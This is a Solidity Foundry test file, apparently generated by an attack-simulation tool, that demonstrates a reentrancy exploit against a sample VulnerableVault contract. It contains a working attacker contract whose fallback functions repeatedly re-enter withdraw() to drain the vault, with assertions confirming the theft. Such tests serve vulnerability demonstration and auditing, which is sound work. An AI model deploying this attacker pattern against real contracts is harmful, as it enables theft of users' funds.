// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../samples/VulnerableVault.sol";

/**
 * @title Reentrancy Exploit Test
 * @notice Demonstrates reentrancy vulnerability in VulnerableVault.withdraw()
 * @dev Generated by Smart Contract Attack Simulator
 *
 * Vulnerability: External call() at line 46 occurs before state variable update at line 50. An attacker can recursively call withdraw() before the state is updated.
 * Location: Line 46
 */
contract ReentrancyExploitTest is Test {
    VulnerableVault public target;
    AttackerContract public attacker;

    address public victim = address(0x1);
    address public attackerEOA = address(0x2);

    uint256 constant INITIAL_BALANCE = 10 ether;
    uint256 constant DEPOSIT_AMOUNT = 1 ether;

    function setUp() public {
        // Deploy the vulnerable contract
        target = new VulnerableVault();

        // Deploy the attacker contract
        attacker = new AttackerContract(payable(address(target)));

        // Fund the victim and have them deposit
        vm.deal(victim, INITIAL_BALANCE);
        vm.prank(victim);
        target.deposit{value: DEPOSIT_AMOUNT}();

        // Fund the attacker
        vm.deal(attackerEOA, INITIAL_BALANCE);
    }

    function testReentrancyExploit() public {
        // Record initial balances
        uint256 targetInitialBalance = address(target).balance;
        uint256 attackerInitialBalance = address(attacker).balance;

        console.log("=== Reentrancy Attack Simulation ===");
        console.log("Target contract balance before attack:", targetInitialBalance);
        console.log("Attacker balance before attack:", attackerInitialBalance);

        // Execute the attack
        vm.prank(attackerEOA);
        attacker.attack{value: DEPOSIT_AMOUNT}();

        // Verify the attack succeeded
        uint256 targetFinalBalance = address(target).balance;
        uint256 attackerFinalBalance = address(attacker).balance;

        console.log("Target contract balance after attack:", targetFinalBalance);
        console.log("Attacker balance after attack:", attackerFinalBalance);
        console.log("ETH drained:", targetInitialBalance - targetFinalBalance);

        // Assert that funds were drained
        assertLt(targetFinalBalance, targetInitialBalance, "Attack should drain funds from target");
        assertGt(attackerFinalBalance, attackerInitialBalance, "Attacker should gain funds");

        console.log("=== EXPLOIT SUCCESSFUL ===");
    }
}

/**
 * @title Attacker Contract
 * @notice Malicious contract that exploits reentrancy
 */
contract AttackerContract {
    VulnerableVault public target;
    uint256 public attackCount;
    uint256 constant MAX_ATTACKS = 5; // Limit recursion for gas

    constructor(address payable _target) {
        target = VulnerableVault(_target);
    }

    function attack() external payable {
        // Deposit to become eligible for withdrawal
        target.deposit{value: msg.value}();

        // Trigger the vulnerable withdraw function
        target.withdraw();
    }

    // Fallback function that re-enters the vulnerable contract
    receive() external payable {
        if (attackCount < MAX_ATTACKS && address(target).balance >= msg.value) {
            attackCount++;
            target.withdraw();
        }
    }

    fallback() external payable {
        if (attackCount < MAX_ATTACKS && address(target).balance >= msg.value) {
            attackCount++;
            target.withdraw();
        }
    }
}
